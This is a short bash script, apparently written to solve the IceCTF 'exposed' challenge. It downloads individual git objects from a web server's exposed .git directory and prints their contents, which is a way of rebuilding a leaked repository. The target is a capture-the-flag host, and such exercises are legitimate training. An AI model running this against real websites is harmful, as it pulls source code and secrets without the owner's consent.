#!/bin/bash

mkdir .git/objects/$1
curl -o .git/objects/$1/$2 http://exposed.vuln.icec.tf/.git/objects/$1/$2
git cat-file -p $1$2

